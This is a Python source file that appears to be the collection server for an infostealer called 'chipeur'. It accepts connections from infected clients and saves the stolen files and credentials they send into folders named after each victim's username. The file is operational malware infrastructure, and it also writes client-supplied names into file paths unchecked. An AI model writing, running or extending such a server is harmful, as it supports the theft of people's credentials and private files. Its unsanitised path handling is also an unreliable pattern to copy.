import socket
import os
import time
import threading

def createpath(username: str, datatype: str):
    """ create the folder to store the data ./username/datatype """
    try :
        os.mkdir(username)
    except FileExistsError: 
        print(f"DEBUG: {username} directory already exists.")
    # except:
    #     print(f"DEBUG: Error while creating the {username} directory. Abort")
    #     return
        
    
    path = os.path.join(username,datatype)
    try :
        os.mkdir(path)
    except FileExistsError:
        print(f"DEBUG: {path} directory already exists.")

    return path

def savefile(username: str, datatype: str, filename: str, client: socket.socket):
    """ create and write a file in the directory ./username/file/"""

    path = createpath(username, datatype)

    # creating a unique file to avoid overwriting
    path = os.path.join(path, str(int(time.time())) + "_" + filename)
    fic = open(path, "w")
    ch = client.recv(9).decode()
    # ending condition, chipeur client allways send it
    while ch[-9:] != "[RUEPIHC]":
        try:
            cur_c = client.recv(1).decode()
            ch += cur_c
        except:
            fic.write(ch)
            fic.close()
            return
    ch = ch[:-9]
    print(f"DEBUG: Writing '{path}' file")
    fic.write(ch)
    fic.close()

def savecreds(username: str, datatype: str, client: socket.socket):
    """ create and write a file in the directory ./username/file/ """
    path = createpath(username, datatype)
    path = os.path.join(path, "creds_" + str(int(time.time())))
    fic = open(path, "w")
    ch = client.recv(9).decode("utf-8")
    # ending condition, chipeur client allways send it
    while ch[-9:] != "[RUEPIHC]":
        try:
            cur_c = client.recv(1).decode("utf-8")
            ch += cur_c
        except:
            fic.write(ch)
            fic.close()
            return
    ch = ch[:-9]
    print(f"DEBUG: Writing '{path}' file")
    fic.write(ch)
    fic.close()
    

def read_bytes_until_next_pipe(client: socket.socket):
    """ this function is used to parse the chipeur request and gather the information of the request """
    ch = b""
    cur_c = b""
    while cur_c != b"|":
        cur_c = client.recv(1)
        ch += cur_c
        
    # we return the data before the pipe
    return ch[:-1]

def handle_client(client_socket, addr):
    print(f"Connection from {addr}")
    try:
        while True:
            # should read [CHIPEUR]
            chipeur = read_bytes_until_next_pipe(client_socket).decode("utf-8")
            print(chipeur)
            if "[CHIPEUR]" not in chipeur:
                client_socket.close()
                break
        
            username = read_bytes_until_next_pipe(client_socket)[:-1].decode("utf-16-be")
            print(username)

            datatype = read_bytes_until_next_pipe(client_socket).decode("utf-8")
            print(datatype)

            # only two datatypes possible
            if datatype == "file":
                filename = read_bytes_until_next_pipe(client_socket)[:-1].decode("utf-16-be")
                print(filename)
                savefile(username, datatype, filename, client_socket)

            if datatype == "credentials":
                savecreds(username, datatype, client_socket)

    except UnicodeDecodeError as error:
        print(f"DEBUG: Connection closed: {error}")
    except ConnectionResetError as error:
        print(f"DEBUG: Connection closed: {error}")
    except TimeoutError as error:
        print(f"DEBUG: Connection closed: {error}")
        client_socket.close()

def start_server(host='0.0.0.0', port=1234):
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address and port
    server_socket.bind((host, port))

    # Listen for incoming connections
    server_socket.listen(1)
    print(f"Listening on {host}:{port}...")

    while True:
        # Accept a connection
        client_socket, addr = server_socket.accept()
        th = threading.Thread(target=handle_client, args=(client_socket, addr))
        th.start()

if __name__ == "__main__":
    start_server()
